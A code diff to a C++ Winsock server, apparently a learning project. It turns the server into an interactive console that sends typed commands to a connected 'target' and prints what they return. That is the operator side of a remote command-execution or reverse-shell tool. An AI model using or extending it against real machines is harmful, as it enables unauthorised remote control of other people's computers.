@@ -1,6 +1,8 @@
 #include <iostream>
 #include <winsock2.h> // to initialize windows socket 
 #include <ws2tcpip.h>    // lib for getting address info
+#include <string>
+
                        
 #pragma comment(lib, "ws2_32.lib");
 
@@ -93,18 +95,18 @@ SOCKET acceptConnection(SOCKET serverSocket) {
 }
 
 // function for sending message to client
-void sendMessage(SOCKET clientSocket, const string &message) {
-    // using c_str() which converts std string into C style string, allows support for more clients through older string conversion
-    int iResult = send(clientSocket, message.c_str(), message.length(), 0);
+// void sendMessage(SOCKET clientSocket, const string &message) {
+//     // using c_str() which converts std string into C style string, allows support for more clients through older string conversion
+//     int iResult = send(clientSocket, message.c_str(), message.length(), 0);
 
-    if(iResult == SOCKET_ERROR) {
-        cerr << "Send failed." << endl;
-        exit (1);
-    }
-    cout << "Message sent to client." << endl;
+//     if(iResult == SOCKET_ERROR) {
+//         cerr << "Send failed." << endl;
+//         exit (1);
+//     }
+//     cout << "Message sent to client." << endl;
     
 
-}
+// }
 
 // for sending commands to target
 void sendCommand(SOCKET clientSocket, const string &command) {
@@ -117,6 +119,7 @@ void sendCommand(SOCKET clientSocket, const string &command) {
 
 }
 
+// receive result of command execution on client side
 string receiveResult(SOCKET clientSocket) {
     // prevents buffer overflow of client
     char buffer[10000];
@@ -130,6 +133,7 @@ string receiveResult(SOCKET clientSocket) {
         cerr << "Recv failed." << endl;
         exit(1);
     }
+    return buffer;
     
 }
 
@@ -140,8 +144,24 @@ int main() {
     listenConnection(serverSocket);
     SOCKET clientSocket = acceptConnection(serverSocket);
 
-    string message = "Connection established";  // message for client side 
-    sendMessage(clientSocket, message);
+    while(true) {
+
+        string command;
+        cout << "~#: ";
+        getline(cin, command);
+
+        // breaks loop if typed exit
+        if(command == "exit") break;
+    
+        sendCommand(clientSocket, command);
+        string result = receiveResult(clientSocket);
+        cout << result << endl;
+
+    }
+   
+
+    // string message = "Connection established";  // message for client side 
+    // sendMessage(clientSocket, message);
 
     return 0;
 }
